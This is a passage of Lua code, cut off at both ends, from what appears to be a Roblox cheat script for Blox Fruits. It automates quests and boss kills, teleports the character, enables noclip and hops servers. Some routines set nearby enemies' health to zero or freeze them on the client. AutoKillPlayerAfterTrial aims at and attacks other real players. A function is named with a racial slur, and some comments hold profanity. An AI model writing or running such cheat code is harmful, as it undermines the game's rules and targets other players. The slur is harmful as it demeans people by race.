                    if getgenv().ServerData["PlayerBackpack"]['Key'] then EquipWeaponName("Key") end
                end 
            else 
                SetContent('Opening door...')
                EquipWeaponName("Key")
                if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Key") then
                    Tweento(game.Workspace.Map.Ice.Door.CFrame)
                end
            end
        else 
            SetContent('Finding Ice Admiral...')
            if getgenv().ServerData['Server Bosses']['Ice Admiral'] then 
                KillBoss(getgenv().ServerData['Server Bosses']['Ice Admiral']) 
                refreshTask()
                task.delay(5,function()
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TravelDressrosa") 
                    thg3m:SetValue('Level')
                cacmem:SetValue(false)
                end)
                getgenv().CurrentTask = ''
            elseif getgenv().ServerData['PlayerData'].Level >= 700 then  
                SetContent('Hopping for Ice Admiral',5)
                HopServer(9,true,"Ice Admiral")
            end
        end
    end
end


    spawn(function()
        while wait() do
        if Config.AutoSea2 then
            AutoSea2()
    end
    end
    end)

    AutoSea3 = function()
        if Sea2 and getgenv().ServerData['PlayerData'].Level >= 1000 then  
            local v135 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("TalkTrevor", "1")
            if v135 and v135 ~= 0 then  
                if checkFruit1M() then 
                    EquipWeaponName(checkFruit1M().Name)
                    game.ReplicatedStorage.Remotes.CommF_:InvokeServer("TalkTrevor", "1")
                    game.ReplicatedStorage.Remotes.CommF_:InvokeServer("TalkTrevor", "2")
                    game.ReplicatedStorage.Remotes.CommF_:InvokeServer("TalkTrevor", "3")  
                    return 
                end
                local v136666 = checkFruit1M(true) 
                if v136666 then 
                    EquipWeaponName(v136666.Name)
                    game.ReplicatedStorage.Remotes.CommF_:InvokeServer("TalkTrevor", "1")
                    game.ReplicatedStorage.Remotes.CommF_:InvokeServer("TalkTrevor", "2")
                    game.ReplicatedStorage.Remotes.CommF_:InvokeServer("TalkTrevor", "3")  
                elseif checkFruit1MWS() then  
                    SetContent('Tween get '..getRealFruit(checkFruit1MWS()))
                    Tweento(checkFruit1MWS().Handle.CFrame)
                    task.wait(.1) 
                    getgenv().CurrentTask = ''
                else 
                    SetContent('Dont Have Fruit So We Must Farm')
                    if _G.HopFruit1M then 
                        SetContent('Hoping for 1M Fruit',5)
                        HopServer(9,math.random(1,2) == 1)  
                    end
                    if getgenv().ServerData['Server Bosses']['Core'] then 
                        KillBoss(getgenv().ServerData['Server Bosses']['Core']) 
                    elseif #getgenv().ServerData['Workspace Fruits'] > 0 then 
                        collectAllFruit_Store()
                    else
                        AutoL()
                    end
                end
            elseif v135 == 0 then
                local ZQuestProgress = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("ZQuestProgress", "Check")
                if not ZQuestProgress then 
                    if getgenv().ServerData['Server Bosses']['Don Swan'] then 
                        KillBoss(getgenv().ServerData['Server Bosses']['Don Swan'])
                    else 
                        SetContent('Hopping for Don Swan',5)
                        HopServer(9,true,"Don Swan")
                    end
                elseif ZQuestProgress == 0 and GetDistance(game:GetService("Workspace").Map.IndraIsland.Part) > 1000 then
                    local RedHeadCFrame =
                        CFrame.new(
                        -1926.78772,
                        12.1678171,
                        1739.80884,
                        0.956294656,
                        -0,
                        -0.292404652,
                        0,
                        1,
                        -0,
                        0.292404652,
                        0,
                        0.956294656
                    )
                    if GetDistance(RedHeadCFrame) <= 50 then
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ZQuestProgress", "Begin")
                    else
                        Tweento(RedHeadCFrame)
                    end
                elseif getgenv().ServerData['Server Bosses']['rip_indra'] then 
                    task.spawn(function()
                        while task.wait(0.1) do 
                            local timetry = 0 
                            if timetry > 500 then break; end 
                            timetry = timetry + 1
                            local args = {
                                [1] = "TravelZou"
                            }
                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                        end
                    end)
                    repeat 
                        KillBoss(getgenv().ServerData['Server Bosses']['rip_indra'])
                    until not getgenv().ServerData['Server Bosses']['rip_indra']
                end 
            end
        end
    end


    spawn(function ()
        while wait() do
            if Config.AutoSea3 then
                AutoSea3()
            end
        end
    end
    )

AutoPole = function()
    if getgenv().ServerData["Inventory Items"]["Pole (1st Form)"] then 
        refreshTask()
        warn("m co roi ma")
        CreateUiNotify({Content = "U already had pole 1st form"})
        repeat task.wait()
        Polelon:SetValue(false)
        until Polelon:SetValue(false)
        return
    end 
    if not Sea1 then 
        TeleportWorld(1)
    end
    if getgenv().ServerData['Server Bosses']['Thunder God'] and Sea1 and PlayerData().Level >= 100 then 
    KillBoss(getgenv().ServerData['Server Bosses']['Thunder God'])
        getgenv().CurrentTask = ''
    elseif getgenv().ServerData['PlayerData'].Level > 500 then 
        repeat task.wait()
            Polelon:SetValue(false)
            until Polelon:SetValue(false)
    end
end

    spawn(function ()
        while wait() do
        if Config.Pole then
    end
    end
    end)

    local function IsUnlockedSaberDoor()
        for i, v in next, game:GetService("Workspace").Map.Jungle.Final:GetChildren() do
            if v:IsA("Part") and not v.CanCollide then
                return true
            end
        end
    end  
    local function SaberTouchTemplate()
        for i, v in next, game:GetService("Workspace").Map.Jungle.QuestPlates:GetChildren() do
            if v:IsA("Model") then
                if v.Button:FindFirstChild("TouchInterest") then
                    return v
                end
            end
        end
    end 
    local function CupDoor()
        return workspace.Map.Desert.Burn.Part.CanCollide == false
    end

AutoSaber = function()
    if PlayerData().Level >= 200 and Sea1 then
        Levellon:SetValue(false)
    task.wait()
    local RichSonProgress = -999
    if getgenv().ServerData["Inventory Items"]["Saber"] then 
        getgenv().CurrentTask = ''
        thg3m:SetValue('Level')
        cacmem:SetValue(true)
        noti("U already had Saber",5)
        repeat task.wait()
        Saberlon:SetValue(false)
        until Saberlon:SetValue(false)
        return
    end
    if not Sea1 then 
        TeleportWorld(1)
    end
    if IsUnlockedSaberDoor() then 
        SetContent('Finding Saber Expert...')
        if getgenv().ServerData['Server Bosses']['Saber Expert'] then 
            KillBoss(getgenv().ServerData['Server Bosses']['Saber Expert']) 
            getgenv().CurrentTask = ''
        elseif getgenv().ServerData['PlayerData'].Level > 200 then 
            noti("Saber Expert died",3)
            thg3m:SetValue('Level')
            cacmem:SetValue(true)
            repeat task.wait()
                Saberlon:SetValue(false)
                until Saberlon:SetValue(false)
        end 
    elseif game:GetService("Workspace").Map.Jungle.QuestPlates.Door.CanCollide then 
        SetContent('Touching templates in jungle...')
        local Template = SaberTouchTemplate()
        if Template then 
            Tweento(Template.Part.CFrame)
        end
    elseif CupDoor() then 
        RichSonProgress = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon")
        if RichSonProgress ~= 0 and RichSonProgress ~= 1 then
            if not getgenv().ServerData["PlayerBackpack"]['Cup'] then 
                Tweento(CFrame.new(1113.66992,7.5484705,4365.27832,-0.78613919,-2.19578524e-08,-0.618049502,1.02977182e-09,1,-3.68374984e-08,0.618049502,-2.95958493e-08,-0.78613919)) 
                SetContent('Getting cup')
            else
                EquipWeaponName('Cup')
                if getgenv().ServerData["PlayerBackpack"]['Cup'].Handle:FindFirstChild('TouchInterest') then 
                    SetContent('Filling cup with water...')
                    Tweento(CFrame.new(1395.77307,37.4733238,-1324.34631,-0.999978602,-6.53588605e-09,0.00654155109,-6.57083277e-09,1,-5.32077493e-09,-0.00654155109,-5.3636442e-09,-0.999978602))  
                else 
                    SetContent('Feeding sick man...')
                    Tweento(CFrame.new(1457.8768310547, 88.377502441406, -1390.6892089844))
                    if GetDistance(CFrame.new(1457.8768310547, 88.377502441406, -1390.6892089844)) < 10 then 
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(
                            "ProQuestProgress",
                            "SickMan"
                        )
                    end
                end
            end
        elseif RichSonProgress == 0 then
            SetContent('Finding Mob Leader...')
            if getgenv().ServerData['Server Bosses']['Mob Leader'] then 
                KillBoss(getgenv().ServerData['Server Bosses']['Mob Leader']) 
            elseif getgenv().ServerData['PlayerData'].Level > 500 then 
                HopServer()
            end
        elseif RichSonProgress == 1 then
            if getgenv().ServerData["PlayerBackpack"]['Relic'] then 
                EquipWeaponName("Relic") 
                Tweento(CFrame.new(-1405.3677978516, 29.977333068848, 4.5685839653015))
            else
                Tweento(CFrame.new(-1404.07996,29.8520069,5.26677656,0.888123989,-4.0340602e-09,0.459603906,7.5884703e-09,1,-5.8864642e-09,-0.459603906,8.71560069e-09,0.888123989))
                if GetDistance(CFrame.new(-1404.07996,29.8520069,5.26677656,0.888123989,-4.0340602e-09,0.459603906,7.5884703e-09,1,-5.8864642e-09,-0.459603906,8.71560069e-09,0.888123989)) < 10 then 
                    game.ReplicatedStorage.Remotes.CommF_:InvokeServer("ProQuestProgress", "RichSon")
                end
            end
        end
    else 
        SetContent('Getting torch...')
        if not getgenv().ServerData["PlayerBackpack"]['Torch'] then  
            Tweento(game:GetService("Workspace").Map.Jungle.Torch.CFrame)
        else  
            EquipWeaponName("Torch") 
            Tweento(CFrame.new(1115.23499,4.92147732,4349.36963,-0.670654476,-2.18307523e-08,0.74176991,-9.06980624e-09,1,2.1230365e-08,-0.74176991,7.51052998e-09,-0.670654476))
        end  
    end
end
end


    spawn(function()
        while wait() do
            if Config.Saber then
            AutoSaber()
    end
    end
    end)
    ----
    function removeFog()
        local c = game.Lighting
        c.FogEnd = 100000
        for i, v in pairs(c:GetDescendants()) do
            if v:IsA("Atmosphere") then
                v:Destroy()
            end
        end
    end 


    function UpdateTPCFrame(FF)
        FF = FF or {}
        FF.CFrame = FF.CFrame or nil 
        FF.Enable = FF.Enable or false 
        AutoTp = FF.Enable 
        TpCFrame = FF.CFrame
    end

    function GetLocalBoat()
        for i, v in next, game:GetService("Workspace").Boats:GetChildren() do
            if v:IsA("Model") then
                if
                    v:FindFirstChild("Owner") and tostring(v.Owner.Value) == game:GetService("Players").LocalPlayer.Name and
                        v.Humanoid.Value > 0
                then
                    return v
                end
            end
        end
        return false
    end

    function DoNoClip(togg)
        if togg then
            if game.Players.LocalPlayer.Character.Humanoid.Sit and not getgenv().ForgotSit then
                Notify("Script Warn", "Player Sitting")
                SendKey("Space", 0.05)
            end
            --game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
            if not game.Players.LocalPlayer.Character.Head:FindFirstChild("BodyVelocity") then
                local bv = Instance.new("BodyVelocity")
                bv.Velocity = Vector3.new(0, 0, 0)
                bv.MaxForce = Vector3.new(999, 999, 999)
                bv.P = 15000
                bv.Parent = game.Players.LocalPlayer.Character.Head
            end
            for i, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                if v:IsA("BasePart") then
                    v.CanCollide = false
                end
            end
        else
            if game.Players.LocalPlayer.Character.Head:FindFirstChild("BodyVelocity") then
                game.Players.LocalPlayer.Character.Head:FindFirstChild("BodyVelocity"):Destroy()
            end
            game.Players.LocalPlayer.Character.Humanoid:ChangeState()
        end
    end

    spawn(function ()
        while wait() do
            if Config.AutoSail and Sea3 then
                if PlayerData().Beli > 2500 then 
        removeFog() 
        UpdateTPCFrame()
        if not GetLocalBoat() then 
            repeat 
                task.wait()
                Tweento(CFrame.new(-16208.3945, 9.06366062, 404.428528, -0.0355736837, 8.33082723e-08, -0.999367058, -6.39925517e-08, 1, 8.56389306e-08, 0.999367058, 6.69985383e-08, -0.0355736837))
                if GetDistance(CFrame.new(-16208.3945, 9.06366062, 404.428528, -0.0355736837, 8.33082723e-08, -0.999367058, -6.39925517e-08, 1, 8.56389306e-08, 0.999367058, 6.69985383e-08, -0.0355736837)) < 8 then 
                    local args = {
                        [1] = "BuyBoat",
                        [2] = "Guardian"
                    }
                    
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                end
            until GetLocalBoat()
        end
        BCFrame = CFrame.new(-43181.7969, 0.105383828, 14132.5957, 0.024771018, -1.42444829e-08, 0.999693155, 3.35462111e-08, 1, 1.34176261e-08, -0.999693155, 3.32035484e-08, 0.024771018)
        repeat task.wait() until GetLocalBoat() 
        if game.Players.LocalPlayer.Character.Humanoid.Sit then 
            if GetDistance(BCFrame,GetLocalBoat().VehicleSeat) > 100 then 
                ForBoat = {}
                for i,v in pairs(GetLocalBoat():GetDescendants()) do 
                    pcall(function()
                        v.CanCollide = false 
                        table.insert(ForBoat,v)
                    end)
                end 
                repeat task.wait()
                    TweenObject(BCFrame,GetLocalBoat().VehicleSeat)
                    getgenv().ForgotSit = true
                    DoNoClip(true) 
                    task.wait()
                until GetDistance(BCFrame,GetLocalBoat().VehicleSeat) < 100 or not game.Players.LocalPlayer.Character.Humanoid.Sit or GetDistance(GetLocalBoat().VehicleSeat) > 100 or not Config.AutoSail
                getgenv().ForgotSit = false 
                DoNoClip(false) 
            else 
                getgenv().ForgotSit = false 
                if ForBoat then 
                    for i,v in pairs(ForBoat) do 
                        v.CanCollide = false 
                    end 
                end
            end
        else
            getgenv().ForgotSit = true
            Tweento(GetLocalBoat().VehicleSeat.CFrame)
        end
    end
    end
    end
    end
    )


    print("Loaded Sea Event functions")

    ---sea 3 func
    Bonecaidai = {
        "Reborn Skeleton [Lv. 1975]",
        "Demonic Soul [Lv. 2025]",
        "Living Zombie [Lv. 2000]",
        "Posessed Mummy [Lv. 2050]",
    }


AutoReaper = function()
    if getgenv().ServerData['Server Bosses']['Soul Reaper'] then
        if getgenv().ServerData['Server Bosses']['Soul Reaper'] then
            KillBoss(getgenv().ServerData['Server Bosses']['Soul Reaper'])
    end
elseif getgenv().ServerData["PlayerBackpack"]['Hallow Essence'] then 
    EquipWeapon("Hallow Essence")
    Tweento(game:GetService("Workspace").Map["Haunted Castle"].Summoner.Detection.CFrame)
else
    local v316, v317, v318, v319 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Bones", "Check")
    if v318 > 0 then 
        CanRollTime = 0
                for i = 1,v318,1 do 
                    if v316 > v318 * 50 then 
                        CanRollTime = CanRollTime+1 
                    end
                end
                for i = 1,CanRollTime,1 do 
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Bones", "Buy", 1, 1)
                end
        if getgenv().ServerData['PlayerData'].Level >= 2000 then  
            if not game.Players.LocalPlayer.PlayerGui.Main:FindFirstChild("Quest").Visible then 
                FarmMobByLevel(2000)
            else 
                KillMobList({
                    "Reborn Skeleton [Lv. 1975]",
                    "Living Zombie [Lv. 2000]",
                    "Demonic Soul [Lv. 2025]",
                    "Posessed Mummy [Lv. 2050]"
                })
            end
        else 
            KillMobList({
                "Reborn Skeleton [Lv. 1975]",
                "Living Zombie [Lv. 2000]",
                "Demonic Soul [Lv. 2025]",
                "Posessed Mummy [Lv. 2050]"
            })
        end
    elseif v316 < 5000 then 
        if getgenv().ServerData['PlayerData'].Level >= 2000 then  
            if not game.Players.LocalPlayer.PlayerGui.Main:FindFirstChild("Quest").Visible then 
                FarmMobByLevel(2000)
            else 
                KillMobList({
                    "Reborn Skeleton [Lv. 1975]",
                    "Living Zombie [Lv. 2000]",
                    "Demonic Soul [Lv. 2025]",
                    "Posessed Mummy [Lv. 2050]"
                })
            end
        else 
            KillMobList({
                "Reborn Skeleton [Lv. 1975]",
                "Living Zombie [Lv. 2000]",
                "Demonic Soul [Lv. 2025]",
                "Posessed Mummy [Lv. 2050]"
            })
        
    end  
    end
    end  
end



    coroutine.wrap(function()
        while wait() do
            if Config.AutoFullyReaper then
                AutoReaper()
            end
        end
    end)()




    ---Kil nhoc me m
    function GetPlayerKillTrial()
        local cc
        pcall(
            function()
                TempleCFrame =
                    CFrame.new(
                    28730.0645,
                    14887.5371,
                    -91.0957718,
                    0.557085216,
                    -4.57713725e-08,
                    0.830455363,
                    9.81919115e-08,
                    1,
                    -1.07530047e-08,
                    -0.830455363,
                    8.75343389e-08,
                    0.557085216
                )
                if game.Players.LocalPlayer.PlayerGui.Main.Timer.Visible then
                    if GetDistance(TempleCFrame) <= 380 then
                        for i, v in pairs(game.Players:GetChildren()) do
                            if
                                v.Name ~= game.Players.LocalPlayer.Name and
                                    (GetDistance(TempleCFrame, v.Character.HumanoidRootPart) <= 300) and
                                    v.Character.Humanoid.Health > 0
                            then
                                cc = v
                            end
                        end
                    end
                end
            end
        )
        return cc
    end  


AutoKillPlayerAfterTrial = function()
    if GetPlayerKillTrial() then 
        EquipWeapon()
        EnableBuso()
        repeat task.wait()  
            pcall(
                function()
                    v = GetPlayerKillTrial().Character
                    getgenv().AimbotPosition = GetPlayerKillTrial().Character.HumanoidRootPart.Position
                    getgenv().AimbotToggle = true
                    getgenv().UseFAttack = true
                    Tweento(GetPlayerKillTrial().Character.HumanoidRootPart.CFrame * GetCFrameADD()) 
                    if GetDistance(GetPlayerKillTrial().Character.HumanoidRootPart) < 300 then
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                            GetPlayerKillTrial().Character.HumanoidRootPart.CFrame * CFrame.new(0, 5, 3)
                            Click()
                            
                            
                            getgenv().UseFAttack = true
                        if GetDistance(GetPlayerKillTrial().Character.HumanoidRootPart) < 50 then 
                            autospamskillmelee = true
                        else
                            autospamskillmelee = false
                        end
                        if not game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui:FindFirstChild("ImageLabel") then
                            SendKey("E")
                        end
                    else
                        
                        getgenv().UseFAttack = false
                        autospamskillmelee = false
                        Tweento(
                            GetPlayerKillTrial().Character.HumanoidRootPart.CFrame * CFrame.new(0, 30, 0)
                        )
                    end
                    if game.Players.LocalPlayer.Character.Stun.Value ~= 0 then
                        autospamskillmelee = false
                        CS = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                            CFrame.new(CS.X, CS.Y + 100, CS.Z)
                        KillingMob = false
                        task.wait(5)
                    end
                end
            )
        until not Config.KillNhoc or
                (not GetPlayerKillTrial() or v.Name ~= GetPlayerKillTrial().Name) or
                not game.Players.LocalPlayer.PlayerGui.Main.Timer.Visible or
                not v or
                not v.Parent or
                not v:FindFirstChild("Humanoid") or
                not v:FindFirstChild("HumanoidRootPart") or
                v.Humanoid.Health <= 0
                getgenv().UseFAttack = false
                
            autospamskillmelee = false
            getgenv().AimbotToggle = false
            getgenv().AimbotPosition = nil
    end

end

    spawn(function()
        while wait() do
            if Config.KillNhoc then
                AutoKillPlayerAfterTrial()
                end
            end
        end)
        






    warn('Check Mob Cake',string.match(game.ReplicatedStorage.Remotes.CommF_:InvokeServer("CakePrinceSpawner", true), "%d+"))


    AutoElite = function() 
        if getgenv().CurrentElite then  
            if
                not string.find(
                    game.Players.LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text,
                    getgenv().CurrentElite.Name
                ) or
                    not game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible
                then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(
                    "AbandonQuest"
                )
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(
                    "EliteHunter"
                )
            else
                KillBoss(getgenv().CurrentElite)
                getgenv().CurrentTask = ''
            end
        else
            if Config.HopYama then
                HopServer(9,true,"Find Elite Boss")
            end
        end
    end


    spawn(function ()
        while wait() do
                if Config.Elite then
                        AutoElite()
        end
    end
    end
    )

AutoYama = function()
    if Sea3 and not getgenv().ServerData["Inventory Items"]["Yama"] then 
        if getgenv().ServerData['PlayerData']["Elite Hunted"] >= 30 then  
            if GetDistance(game.Workspace.Map.Waterfall.SealedKatana.Handle.CFrame) > 50 then 
                SetContent('Tweening to temple to get yama...')
                Tweento(game.Workspace.Map.Waterfall.SealedKatana.Handle.CFrame * CFrame.new(0, 20, 0))
            else
                repeat 
                    task.wait()
                    repeat 
                        task.wait()
                        for i,v in pairs(workspace.Enemies:GetChildren()) do 
                            if v:FindFirstChildOfClass('Humanoid') then 
                                v:FindFirstChildOfClass('Humanoid').Health = 0 
                            end 
                        end  
                    until not game.Workspace.Enemies:FindFirstChild("Ghost [Lv. 1500]")
                    if not game.Workspace.Enemies:FindFirstChild("Ghost [Lv. 1500]") then
                        SetContent('Getting Yama')
                        fireclickdetector(game.Workspace.Map.Waterfall.SealedKatana.Handle.ClickDetector)
                    end
                until getgenv().ServerData["Inventory Items"]["Yama"] 
                getgenv().CurrentTask = '' 
            end 
        else
            Config.HopYama = true
            AutoElite()
        end
    end
end


    spawn(function ()
                while wait() do
            if Config.Yamahihi then
        AutoYama()
    end
        end
    end
    )

    AutoTushita = function()
        if not getgenv().ServerData["Inventory Items"]["Tushita"] then 
            if getgenv().ServerData['Server Bosses']['rip_indra True Form'] then 
                if not game:GetService("Workspace").Map.Turtle:FindFirstChild("TushitaGate") then 
                    if getgenv().ServerData['Server Bosses']['Longma'] then 
                        KillBoss(getgenv().ServerData['Server Bosses']['Longma'])
                        getgenv().CurrentTask = '' 
                    else
                        HopServer(9,true,"Find Long Ma")
                    end
                elseif game:GetService("Workspace").Map.Turtle:FindFirstChild("TushitaGate") then
                    if getgenv().ServerData["PlayerBackpack"]['Holy Torch'] then
                        EquipWeaponName("Holy Torch") 
                        SetContent('Finding new torch touching template...')
                        if (function() 
                            for i = 1,5,1 do 
                                if not game:GetService("Workspace").Map.Turtle.QuestTorches['Torch'..tostring(i)].Particles.Main.Enabled then 
                                    return game:GetService("Workspace").Map.Turtle.QuestTorches['Torch'..tostring(i)]
                                end 
                            end
                        end)() then
                            SetContent('Tweening to torch touching template')
                            Tweento((function() 
                                for i = 1,5,1 do 
                                    if not game:GetService("Workspace").Map.Turtle.QuestTorches['Torch'..tostring(i)].Particles.Main.Enabled then 
                                        return game:GetService("Workspace").Map.Turtle.QuestTorches['Torch'..tostring(i)]
                                    end 
                                end
                            end)().CFrame)
                            SetContent('Uhm') 
                            if not game:GetService("Workspace").Map.Turtle:FindFirstChild("TushitaGate") then  
                                getgenv().CurrentTask = ''  
                            end
                        end
                    else
                        SetContent('Getting Holy Torch...')
                        repeat 
                            Tweento(game:GetService("Workspace").Map.Waterfall.SecretRoom.Room.Door.Door.Hitbox.CFrame)
                            task.wait(1)
                        until getgenv().ServerData["PlayerBackpack"]['Holy Torch']
                        SetContent('Got Holy Torch.')
                    end 
                else
                    KillBoss(getgenv().ServerData['Server Bosses']['rip_indra True Form'])
                end
            elseif not game:GetService("Workspace").Map.Turtle:FindFirstChild("TushitaGate") then 
                if getgenv().ServerData['Server Bosses']['Longma'] then 
                    KillBoss(getgenv().ServerData['Server Bosses']['Longma'])
                    getgenv().CurrentTask = '' 
                else
                    HopServer(9,true,"Find Long Ma")
                end
            end
        end
    end

    spawn(function ()
        while wait() do
            if Config.Tushitahihi then
                AutoTushita()
                end
            end
        end

            )


            AutoSoulGuitar = function() 
                if Sea1 then return end
                local BlankTablets = {
                    "Segment6",
                    "Segment2",
                    "Segment8",
                    "Segment9",
                    "Segment5"
                }
                local Trophy = {
                    ["Segment1"] = "Trophy1",
                    ["Segment3"] = "Trophy2",
                    ["Segment4"] = "Trophy3",
                    ["Segment7"] = "Trophy4",
                    ["Segment10"] = "Trophy5",
                }
                local Pipes = {
                    ["Part1"] = "Really black",
                    ["Part2"] = "Really black",
                    ["Part3"] = "Dusty Rose",
                    ["Part4"] = "Storm blue",
                    ["Part5"] = "Really black",
                    ["Part6"] = "Parsley green",
                    ["Part7"] = "Really black",
                    ["Part8"] = "Dusty Rose",
                    ["Part9"] = "Really black",
                    ["Part10"] = "Storm blue",
                }
                local CurrnetPuzzle = game.ReplicatedStorage.Remotes["CommF_"]:InvokeServer("GuitarPuzzleProgress", "Check")
                if not getgenv().SoulGuitarPuzzlePassed then 
                    getgenv().SoulGuitarPuzzlePassed = (function()
                        local LLL = CurrnetPuzzle
                        return LLL and LLL.Trophies and LLL.Ghost and LLL.Gravestones and LLL.Swamp and LLL.Pipes 
                    end)()
                end 
                if not getgenv().SoulGuitarPuzzlePassed then 
                    if not CurrnetPuzzle then  
                        SetContent("Unlocking Soul Guitar's Puzzle (Praying Grave Stone)",5)
                        if not Sea3 then 
                            TeleportWorld(3)
                        elseif game.Lighting.Sky.MoonTextureId == "http://www.roblox.com/asset/?id=9709149431" and (game.Lighting.ClockTime > 15 or game.Lighting.ClockTime < 5) then   
                            if game.Lighting.ClockTime > 18 or game.Lighting.ClockTime < 5 then
                                Tweento(CFrame.new(-8654.314453125, 140.9499053955078, 6167.5283203125)) 
                                if GetDistance(CFrame.new(-8654.314453125, 140.9499053955078, 6167.5283203125)) < 10 then
                                    CheckRemote = game.ReplicatedStorage.Remotes["CommF_"]:InvokeServer("gravestoneEvent", 2) 
                                    if CheckRemote ~= true then return end 
                                    require(game.ReplicatedStorage.Effect).new("BlindCam"):replicate({
                                        Color = Color3.new(0.03, 0.03, 0.03), 
                                        Duration = 2, 
                                        Fade = 0.25, 
                                        ZIndex = -10
                                    });
                                    require(game.ReplicatedStorage.Util.Sound):Play("Thunder", workspace.CurrentCamera.CFrame.p); 
                                    game.ReplicatedStorage.Remotes.CommF_:InvokeServer("gravestoneEvent", 2, true)
                                    SetContent('Completed')  
                                    getgenv().CurrentTask = ''
                                    return
                                end  
                            end
                        else 
                            HopServer(10,true,"Full Moon")
                        end 
                    elseif not CurrnetPuzzle.Swamp then  
                        SetContent("Unlocking Soul Guitar's Puzzle (Swamp: Kill 6 Zombie at same time)",5)
                        if not Sea3 then 
                            TeleportWorld(3)
                        elseif GetDistance(CFrame.new(-10171.7607421875, 138.62667846679688, 6008.0654296875)) > 300 then
                            Tweento(CFrame.new(-10171.7607421875, 138.62667846679688, 6008.0654296875) * CFrame.new(0,25,-20))
                        else
                            if CheckAnyPlayersInCFrame(CFrame.new(-10171.7607421875, 138.62667846679688, 6008.0654296875), 500) then
                                SetContent('Players In Area | Hopping for peace',5)
                                HopServer(10,true,"Peace Area")
                            else
                                if (function() 
                                    local Cos = 0   
                                    for i ,v in pairs(game.workspace.Enemies:GetChildren()) do 
                                        if RemoveLevelTitle(v.Name) == "Living Zombie" and v.Humanoid.Health > 0 then
                                            if GetDistance(CFrame.new(-10171.7607421875, 138.62667846679688, 6008.0654296875),v.HumanoidRootPart) <= 20 then 
                                                Cos = Cos + 1
                                            end
                                        end
                                    end
                                    return Cos
                                end)() == 6 then
                                    warn('Zombie Near')
                                    for i, v in pairs(game.workspace.Enemies:GetChildren()) do
                                        if
                                            RemoveLevelTitle(v.Name) == "Living Zombie" and v:FindFirstChild("HumanoidRootPart") and
                                                v:FindFirstChild("Humanoid") and
                                                v.Humanoid.Health > 0
                                        then
                                            repeat
                                                wait()
                                                KillNigga(v)
                                            until v.Humanoid.Health <= 0 or not v.Parent
                                        end
                                    end
                                else
                                    warn('Not 6 Zombie');
                                    (function()
                                        for i, v in pairs(game.workspace.Enemies:GetChildren()) do
                                            if RemoveLevelTitle(v.Name) == "Living Zombie" and v:FindFirstChild("Humanoid") and
                                                    v:FindFirstChild("HumanoidRootPart") --and isnetworkowner(v.HumanoidRootPart)
                                                then
                                                v.HumanoidRootPart.CFrame = CFrame.new(-10171.7607421875, 138.62667846679688, 6008.0654296875)
                                                v.Humanoid:ChangeState(14)
                                                v.PrimaryPart.CanCollide = false
                                                v.Head.CanCollide = false
                                                v.Humanoid.WalkSpeed = 0
                                                v.Humanoid.JumpPower = 0
                                                if v.Humanoid:FindFirstChild("Animator") then
                                                    v.Humanoid.Animator:Destroy()
                                                end
                                            end
                                        end
                                    end)()
                                end
                            end
                        end
                    elseif not CurrnetPuzzle.Gravestones then 
                        SetContent("Unlocking Soul Guitar's Puzzle (Grave Stones: Clicking Signs)")
                        if not Sea3 then 
                            TeleportWorld(3)
                        elseif GetDistance(CFrame.new(-8761.4765625, 142.10487365722656, 6086.07861328125)) > 50 then
                            Tweento(CFrame.new(-8761.4765625, 142.10487365722656, 6086.07861328125))
                        else
                            local ClickSigns = {
                                game.workspace.Map["Haunted Castle"].Placard1.Right.ClickDetector,
                                game.workspace.Map["Haunted Castle"].Placard2.Right.ClickDetector,
                                game.workspace.Map["Haunted Castle"].Placard3.Left.ClickDetector,
                                game.workspace.Map["Haunted Castle"].Placard4.Right.ClickDetector,
                                game.workspace.Map["Haunted Castle"].Placard5.Left.ClickDetector,
                                game.workspace.Map["Haunted Castle"].Placard6.Left.ClickDetector,
                                game.workspace.Map["Haunted Castle"].Placard7.Left.ClickDetector
                            }
                            for i, v in pairs(ClickSigns) do
                                fireclickdetector(v)
                            end
                        end  
                    elseif not CurrnetPuzzle.Ghost then 
                        SetContent("Unlocking Soul Guitar's Puzzle (Ghost: Talking to the ghost)") 
                        if not Sea3 then 
                            TeleportWorld(3)
                        elseif GetDistance(CFrame.new(-9755.6591796875, 271.0661315917969, 6290.61474609375)) > 7 then
                            Tweento(CFrame.new(-9755.6591796875, 271.0661315917969, 6290.61474609375))
                            game.ReplicatedStorage.Remotes["CommF_"]:InvokeServer("GuitarPuzzleProgress", "Ghost") 
                            wait(3)
                        end 
                    elseif not CurrnetPuzzle.Trophies then 
                        SetContent("Unlocking Soul Guitar's Puzzle (Trophies: Unlock the Trophies's Puzzle)") 
                        if not Sea3 then 
                            TeleportWorld(3)
                        elseif GetDistance(CFrame.new(-9530.0126953125, 6.104853630065918, 6054.83349609375)) > 30 then
                            Tweento(CFrame.new(-9530.0126953125, 6.104853630065918, 6054.83349609375)) 
                        else 
                            local DepTraiv4 = game.workspace.Map["Haunted Castle"].Tablet
                            for i, v in pairs(BlankTablets) do
                                local x = DepTraiv4[v]
                                if x.Line.Position.X ~= 0 then
                                    repeat
                                        wait()
                                        fireclickdetector(x.ClickDetector)
                                    until x.Line.Position.X == 0
                                end
                            end
                            for i, v in pairs(Trophy) do
                                local x = game.workspace.Map["Haunted Castle"].Trophies.Quest[v].Handle.CFrame
                                x = tostring(x)
                                x = x:split(", ")[4]
                                local c = "180"
                                if x == "1" or x == "-1" then
                                    c = "90"
                                end
